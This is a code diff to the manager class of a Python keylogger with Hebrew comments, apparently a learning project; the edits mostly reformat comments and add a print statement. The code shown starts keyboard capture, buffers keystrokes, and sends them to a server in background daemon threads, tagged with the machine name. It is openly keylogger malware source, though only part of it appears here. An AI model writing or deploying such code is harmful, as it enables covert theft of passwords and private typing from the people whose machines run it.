@@ -10,8 +10,8 @@ from network_writer import NetworkSaver
 
 class KeyloggerManager:
 
-    def __init__(self,key):         #בעת יצירת מופע יש להכניס מפתח הצפנה ושם קובץ/ניתוב לשרת
-        self.keylogger_listener = ListenerKeyboard()       # נוצרים אוטומטית מופעים של ListenerKeyboard() וFileWriter()
+    def __init__(self,key):         #בעת יצירת מופע יש להכניס מפתח הצפנה
+        self.keylogger_listener = ListenerKeyboard()       # נוצרים אוטומטית מופעים של ListenerKeyboard() וFileWriter()/ NetworkWriter()
         self.buffer = {}
         self.key = key
         self.to_send = NetworkSaver()
@@ -20,15 +20,16 @@ class KeyloggerManager:
         self.running = False
 
 
-    def start(self):
-        # פונקציה להפעלת כל תכונות הKeyloggerManager
+    def start(self):          # פונקציה להפעלת כל תכונות הKeyloggerManager
         self.running = True
-        self.keylogger_listener.start_logging()           # מתחיל האזנה למקלדת
-        threading.Thread(target=self.get_update,daemon=True).start() # יצירת תהליך נוסף האחראי לריצת הפונקציה get_update() הרץ במקביל לפונקציה  send_data()
+        # מתחיל האזנה למקלדת
+        self.keylogger_listener.start_logging()
+        # יצירת תהליכון האחראי לריצת הפונקציה get_update() הרץ במקביל לתהליכון  send_data()
+        threading.Thread(target=self.get_update,daemon=True).start()
         # מתחיל תהליכון לשליחת הנתונים לשרת
         threading.Thread(target=self.send_data, daemon=True).start()
 
-                                                     # הפעלה של התהליך השני send_data()
+
 
     def stop(self):
         """עוצר את הניטור ושולח את הנתונים באופן מיידי."""
@@ -88,6 +89,7 @@ class KeyloggerManager:
                 print("send succesfully")
             except:
                 self.to_send.send_data(text, f"{self.machine_name}")
+                print("send succesfully")
 
 
 
